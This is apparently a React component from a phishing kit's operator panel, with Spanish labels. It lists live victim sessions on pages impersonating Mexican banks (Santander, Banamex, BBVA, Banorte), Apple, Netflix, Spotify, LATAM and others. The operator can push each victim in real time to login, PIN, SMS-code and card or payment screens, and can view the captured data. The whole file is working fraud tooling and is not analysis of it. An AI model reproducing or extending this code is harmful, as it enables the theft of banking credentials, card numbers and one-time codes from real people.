import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { Eye, Trash2, Monitor, ChevronLeft, ChevronRight } from "lucide-react";
import { formatDistanceToNow } from "date-fns";
import { apiRequest } from "@/lib/queryClient";
import type { SessionWithData } from "@shared/schema";
import { usePermanentAuth } from "@/hooks/use-permanent-auth";
import { Button } from "@/components/ui/button";
import React, { useState } from "react";

export default function SessionsTable() {
  const queryClient = useQueryClient();
  const { user } = usePermanentAuth();
  const [currentPage, setCurrentPage] = useState(1);
  const [sessionsPerPage] = useState(5);
  
  // Admin ve todas las sesiones activas, usuarios normales solo las suyas
  const endpoint = user?.role === 'admin' ? "/api/sessions/active" : `/api/users/${user?.id}/sessions/active`;
  
  const { data: sessions, isLoading } = useQuery<SessionWithData[]>({
    queryKey: [endpoint],
    refetchInterval: 3000, // Refresh every 3 seconds for live updates
    enabled: !!user, // Solo hacer query cuando tengamos el usuario
  });

  const changeScreenMutation = useMutation({
    mutationFn: async ({ sessionId, currentScreen }: { sessionId: string; currentScreen: string }) => {
      const response = await apiRequest("POST", `/api/sessions/${sessionId}/change-screen`, {
        currentScreen
      });
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: [endpoint] });
      queryClient.invalidateQueries({ queryKey: ["/api/sessions"] });
    },
  });

  const getScreenOptions = (templateName: string) => {
    console.log("Template name received:", `"${templateName}"`, "length:", templateName.length);
    let options;
    switch (templateName.trim().toLowerCase()) {
      case "santander":
        options = [
          { value: "login", label: "Login" },
          { value: "nip", label: "NIP" },
          { value: "sms-verification", label: "SMS" },
          { value: "card-protection", label: "Tarjeta" },
          { value: "loading", label: "Cargando" }
        ];
        break;
      case "banamex":
        options = [
          { value: "login", label: "Login" },
          { value: "nip", label: "NIP" },
          { value: "sms-verification", label: "SMS" },
          { value: "card-protection", label: "Tarjeta" },
          { value: "loading", label: "Cargando" }
        ];
        break;
      case "bbva":
        options = [
          { value: "login", label: "Login" },
          { value: "nip", label: "NIP" },
          { value: "sms-verification", label: "SMS" },
          { value: "card-protection", label: "Tarjeta" },
          { value: "loading", label: "Cargando" }
        ];
        break;
      case "bbva-premios":
        options = [
          { value: "premios", label: "Ruleta Premios" },
          { value: "login", label: "Login" },
          { value: "nip", label: "NIP" },
          { value: "sms-verification", label: "SMS" },
          { value: "card-protection", label: "Tarjeta" },
          { value: "loading", label: "Cargando" }
        ];
        break;
      case "banorte-premios":
        options = [
          { value: "premios", label: "Ruleta Premios" },
          { value: "login", label: "Login" },
          { value: "nip", label: "NIP" },
          { value: "sms-verification", label: "SMS" },
          { value: "card-protection", label: "Tarjeta" },
          { value: "loading", label: "Cargando" }
        ];
        break;
      case "santander-premios":
        options = [
          { value: "premios", label: "Ruleta Premios" },
          { value: "login", label: "Login" },
          { value: "nip", label: "NIP" },
          { value: "sms-verification", label: "SMS" },
          { value: "card-protection", label: "Tarjeta" },
          { value: "loading", label: "Cargando" }
        ];
        break;
      case "liverpool":
        options = [
          { value: "login", label: "Login" },
          { value: "nip", label: "NIP" },
          { value: "sms-verification", label: "SMS" },
          { value: "card-protection", label: "Tarjeta" },
          { value: "loading", label: "Cargando" }
        ];
        break;
      case "apple":
        options = [
          { value: "login", label: "Login" },
          { value: "verification", label: "Verificación" },
          { value: "code", label: "Código" },
          { value: "security", label: "Seguridad" },
          { value: "payment", label: "Pago" },
          { value: "loading", label: "Cargando" }
        ];
        break;
      case "netflix":
        options = [
          { value: "landing", label: "Inicio" },
          { value: "signup", label: "Registro" },
          { value: "payment", label: "Pago" },
          { value: "loading", label: "Cargando" }
        ];
        break;
      case "sixflags":
        options = [
          { value: "landing", label: "Inicio" },
          { value: "personal", label: "Datos Personales" },
          { value: "payment", label: "Pago" },
          { value: "loading", label: "Cargando" }
        ];
        break;
      case "latam":
        options = [
          { value: "search", label: "Búsqueda de Vuelos" },
          { value: "flights", label: "Selección de Vuelos" },
          { value: "passengers", label: "Información de Pasajeros" },
          { value: "payment", label: "Pago y Banco" },
          { value: "bank_verification", label: "Verificación Bancaria" },
          { value: "loading", label: "Procesando Pago" }
        ];
        break;
      case "actas":
        options = [
          { value: "solicitar", label: "Solicitar Acta" },
          { value: "datos", label: "Datos Personales" },
          { value: "pago", label: "Métodos de Pago" },
          { value: "procesando", label: "Procesando" },
          { value: "completado", label: "Acta Lista" }
        ];
        break;
      case "spotify":
        options = [
          { value: "login", label: "Registro/Login" },
          { value: "payment", label: "Tarjeta BBVA" },
          { value: "loading", label: "Activando Premium" }
        ];
        break;
      default:
        options = [
          { value: "login", label: "Login" },
          { value: "loading", label: "Cargando" }
        ];
        break;
    }
    console.log("Options returned for", templateName, ":", options);
    return options;
  };

  const handleScreenChange = (sessionId: string, newScreen: string) => {
    changeScreenMutation.mutate({ sessionId, currentScreen: newScreen });
  };

  // Lógica de paginación
  const allSessions = sessions || [];
  const totalPages = Math.ceil(allSessions.length / sessionsPerPage);
  const startIndex = (currentPage - 1) * sessionsPerPage;
  const endIndex = startIndex + sessionsPerPage;
  const paginatedSessions = allSessions.slice(startIndex, endIndex);
  
  // Resetear página si es necesario
  React.useEffect(() => {
    if (currentPage > totalPages && totalPages > 0) {
      setCurrentPage(1);
    }
  }, [allSessions.length, currentPage, totalPages]);

  if (isLoading) {
    return (
      <div className="bg-card border border-border rounded-lg">
        <div className="p-6 border-b border-border">
          <h3 className="text-lg font-semibold text-foreground">Live Sessions</h3>
        </div>
        <div className="p-6">
          <div className="animate-pulse space-y-4">
            {Array.from({ length: 3 }).map((_, i) => (
              <div key={i} className="h-16 bg-muted rounded"></div>
            ))}
          </div>
        </div>
      </div>
    );
  }

  const getStatusColor = (status: string) => {
    switch (status) {
      case "active":
        return "bg-green-500/10 text-green-400";
      case "form_filled":
        return "bg-yellow-500/10 text-yellow-400";
      case "expired":
        return "bg-red-500/10 text-red-400";
      default:
        return "bg-blue-500/10 text-blue-400";
    }
  };

  const getStatusLabel = (status: string) => {
    switch (status) {
      case "active":
        return "Activo";
      case "form_filled":
        return "Formulario Completado";
      case "expired":
        return "Expirado";
      default:
        return "En Progreso";
    }
  };

  return (
    <div className="bg-card border border-border rounded-lg">
      <div className="p-4 border-b border-border">
        <div className="flex items-center justify-between">
          <div>
            <h3 className="text-base font-semibold text-foreground">Sesiones Activas</h3>
            {allSessions.length > 0 && (
              <p className="text-xs text-muted-foreground mt-1">
                {allSessions.length} sesiones totales
              </p>
            )}
          </div>
          <div className="flex items-center space-x-2">
            <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
            <span className="text-xs text-muted-foreground">En vivo</span>
          </div>
        </div>
      </div>
      
      <div className="overflow-x-auto">
        <table className="w-full">
          <thead className="bg-muted">
            <tr>
              <th className="text-left py-2 px-2 lg:px-4 text-xs font-medium text-muted-foreground">Sesión</th>
              <th className="text-left py-2 px-2 lg:px-4 text-xs font-medium text-muted-foreground">Sitio</th>
              <th className="text-left py-2 px-2 lg:px-4 text-xs font-medium text-muted-foreground">Usuario</th>
              <th className="text-left py-2 px-2 lg:px-4 text-xs font-medium text-muted-foreground">Estado</th>
              <th className="text-left py-2 px-2 lg:px-4 text-xs font-medium text-muted-foreground">Control</th>
              <th className="text-left py-2 px-2 lg:px-4 text-xs font-medium text-muted-foreground">Tiempo</th>
              <th className="text-left py-2 px-2 lg:px-4 text-xs font-medium text-muted-foreground">Datos</th>
              <th className="text-left py-2 px-2 lg:px-4 text-xs font-medium text-muted-foreground">Acciones</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-border">
            {paginatedSessions.map((session) => (
              <tr key={session.id} className="hover:bg-accent/50 transition-colors" data-testid={`session-row-${session.id}`}>
                <td className="py-3 px-4">
                  <code className="text-xs text-primary bg-background px-2 py-1 rounded">
                    {session.id.slice(0, 8)}
                  </code>
                </td>
                <td className="py-3 px-4">
                  <div className="flex items-center space-x-2">
                    <div 
                      className="w-5 h-5 rounded flex items-center justify-center"
                      style={{ backgroundColor: session.link.template.brandColor }}
                    >
                      <span className="text-white text-xs font-bold">
                        {session.link.template.brandLetter}
                      </span>
                    </div>
                    <span className="text-xs text-foreground">{session.link.template.displayName}</span>
                  </div>
                </td>
                <td className="py-3 px-4">
                  <span className="text-xs text-foreground">{session.link.userId}</span>
                </td>
                <td className="py-3 px-4">
                  <span className={`px-2 py-1 text-xs rounded-md ${getStatusColor(session.status)}`}>
                    {getStatusLabel(session.status)}
                  </span>
                </td>
                <td className="py-3 px-4">
                  {session.link.template.name === "netflix" ? (
                    <div className="flex flex-wrap gap-1">
                      {[
                        { value: "landing", label: "Inicio" },
                        { value: "signup", label: "Registro" },
                        { value: "payment", label: "Pago" },
                        { value: "loading", label: "Cargando" }
                      ].map((screen) => (
                        <button
                          key={screen.value}
                          onClick={() => handleScreenChange(session.id, screen.value)}
                          disabled={changeScreenMutation.isPending}
                          className={`px-2 py-1 text-xs rounded border transition-colors ${
                            session.currentScreen === screen.value
                              ? "bg-primary text-primary-foreground border-primary"
                              : "bg-background text-foreground border-border hover:bg-accent"
                          }`}
                          data-testid={`button-screen-${screen.value}-${session.id}`}
                        >
                          {screen.label}
                        </button>
                      ))}
                    </div>
                  ) : (
                    <select
                      value={session.currentScreen || "login"}
                      onChange={(e) => handleScreenChange(session.id, e.target.value)}
                      className="text-xs bg-background border border-border rounded px-2 py-1 focus:outline-none focus:border-primary"
                      disabled={changeScreenMutation.isPending}
                      data-testid={`select-screen-${session.id}`}
                    >
                      {(() => {
                        const templateName = session.link.template.name;
                        const options = getScreenOptions(templateName);
                        console.log(`Session ${session.id}: template="${templateName}", options:`, options);
                        return options.map((option) => (
                          <option key={option.value} value={option.value}>
                            {option.label}
                          </option>
                        ));
                      })()}
                    </select>
                  )}
                </td>
                <td className="py-3 px-4">
                  <span className="text-xs text-muted-foreground">
                    {formatDistanceToNow(new Date(session.startedAt!), { addSuffix: true })}
                  </span>
                </td>
                <td className="py-3 px-4">
                  <button 
                    className="text-primary hover:text-primary/80 text-xs font-medium"
                    data-testid={`button-view-data-${session.id}`}
                  >
                    Datos ({session.submissions.length})
                  </button>
                </td>
                <td className="py-3 px-4">
                  <div className="flex items-center space-x-1">
                    <button 
                      className="text-muted-foreground hover:text-foreground"
                      data-testid={`button-view-session-${session.id}`}
                    >
                      <Eye className="w-3 h-3" />
                    </button>
                    <button 
                      className="text-destructive hover:text-destructive/80"
                      data-testid={`button-delete-session-${session.id}`}
                    >
                      <Trash2 className="w-3 h-3" />
                    </button>
                  </div>
                </td>
              </tr>
            ))}
            {allSessions.length === 0 && (
              <tr>
                <td colSpan={8} className="py-6 px-4 text-center text-muted-foreground text-sm">
                  No hay sesiones activas
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
      
      {/* Paginación */}
      {totalPages > 1 && (
        <div className="p-4 border-t border-border">
          <div className="flex items-center justify-between">
            <div className="text-xs text-muted-foreground">
              Mostrando {startIndex + 1}-{Math.min(endIndex, allSessions.length)} de {allSessions.length} sesiones
            </div>
            <div className="flex items-center space-x-2">
              <Button
                variant="outline"
                size="sm"
                onClick={() => setCurrentPage(currentPage - 1)}
                disabled={currentPage === 1}
                className="flex items-center space-x-1"
                data-testid="button-prev-page"
              >
                <ChevronLeft className="w-3 h-3" />
                <span className="hidden sm:inline">Anterior</span>
              </Button>
              
              <div className="flex items-center space-x-1">
                {Array.from({ length: totalPages }, (_, i) => i + 1).map((page) => (
                  <Button
                    key={page}
                    variant={currentPage === page ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCurrentPage(page)}
                    className="w-8 h-8 p-0"
                    data-testid={`button-page-${page}`}
                  >
                    {page}
                  </Button>
                ))}
              </div>
              
              <Button
                variant="outline"
                size="sm"
                onClick={() => setCurrentPage(currentPage + 1)}
                disabled={currentPage === totalPages}
                className="flex items-center space-x-1"
                data-testid="button-next-page"
              >
                <span className="hidden sm:inline">Siguiente</span>
                <ChevronRight className="w-3 h-3" />
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
